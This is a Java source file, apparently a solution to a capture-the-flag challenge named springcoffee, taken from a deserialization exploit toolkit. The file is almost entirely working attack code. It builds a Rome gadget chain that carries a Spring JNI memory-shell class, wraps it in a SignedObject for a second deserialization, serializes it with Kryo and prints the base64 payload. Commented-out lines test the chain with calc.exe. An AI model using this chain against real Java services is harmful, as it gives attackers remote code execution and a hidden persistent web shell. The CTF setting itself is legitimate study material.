package xyz.eki.marshalexp.solution;

import xyz.eki.marshalexp.gadget.jdk.GSignedObject;
import xyz.eki.marshalexp.memshell.MSpringJNIController;
import xyz.eki.marshalexp.poc.Rome;
import xyz.eki.marshalexp.utils.MiscUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import java.security.SignedObject;

//Solution to thttps://github.com/EkiXu/My-CTF-Challenge/tree/main/springcoffee
public class SpringCoffee {
    public static void main(String[] args) throws Exception{
        Rome gen = new Rome();
//        {
//            Object poc = new Rome().getPocObject("calc.exe");
//            byte[] b = SerializeUtils.serialize(poc);
//            Object poc2 = SerializeUtils.deserialize(b);
//        }
        //Object poc1 = gen.getPocObject("calc.exe");
        byte[] code = MiscUtils.dumpClass(MSpringJNIController.class);
        Object poc1 = gen.getPocObject(code);
        SignedObject go = GSignedObject.getter2Deserialize(poc1);
        Object poc2 = gen.getPocObject(SignedObject.class,go);

//        byte[] b = SerializeUtils.hessian2Serialize(poc2);
//        SerializeUtils.hessian2Deserialize(b);
        byte[] b = SerializeUtils.kryoSerialize(poc2);
        //SerializeUtils.kryoAltDeserialize(b);
        System.out.println(MiscUtils.base64Encode(b));
    }
}
